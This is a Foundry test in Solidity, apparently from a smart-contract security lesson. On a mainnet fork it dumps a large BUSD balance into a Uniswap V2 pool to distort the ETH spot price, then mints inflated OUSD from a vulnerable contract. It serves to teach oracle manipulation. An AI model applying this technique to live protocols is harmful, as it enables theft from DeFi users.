// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {IUniswapV2Pair, OUSD} from "../S15_OracleManipulation.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IUniswapV2Router02 {
  function swapExactTokensForTokens(
    uint amountIn,
    uint amountOutMin,
    address[] calldata path,
    address to,
    uint deadline
  ) external returns (uint[] memory amounts);
}

contract OracleManipulation_Test is Test {
  address private constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
  address private constant BUSD = 0x4Fabb145d64652a948d72533023f6E7A623C7C53; // token0
  address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // token1

  function setUp() public {
    string memory MAINNET_RPC_URL = vm.envString("mainnet");
    console.log("mainnet:", MAINNET_RPC_URL);
    vm.createSelectFork(MAINNET_RPC_URL,16060405);
  }

  function testOracleManipulation() public {
    OUSD token = new OUSD();
    address alice = address(100);
    
    uint256 busdAmount = 1000000 ether;
    deal(alice, 1 ether);
    deal(BUSD, alice, busdAmount);

    vm.startPrank(alice);
    address[] memory path = new address[](2);
    path[0] = BUSD;
    path[1] = WETH;
    console.log("before uniswap, eth price:", token.getEthPrice());
    IERC20(BUSD).approve(ROUTER, busdAmount);
    IUniswapV2Router02(ROUTER).swapExactTokensForTokens({
    amountIn : busdAmount,
    amountOutMin : 1,
    path : path,
    to : alice,
    deadline : block.timestamp + 24 * 60 * 60
    });
    console.log("after uniswap, eth price:", token.getEthPrice());
    assertEq(IERC20(BUSD).balanceOf(alice), 0);

    console.log("before token swap, OUSD balance:", token.balanceOf(alice));
    token.swap{value : 1 ether}();
    console.log("after token swap, OUSD balance:", token.balanceOf(alice));
    vm.stopPrank();
  }
}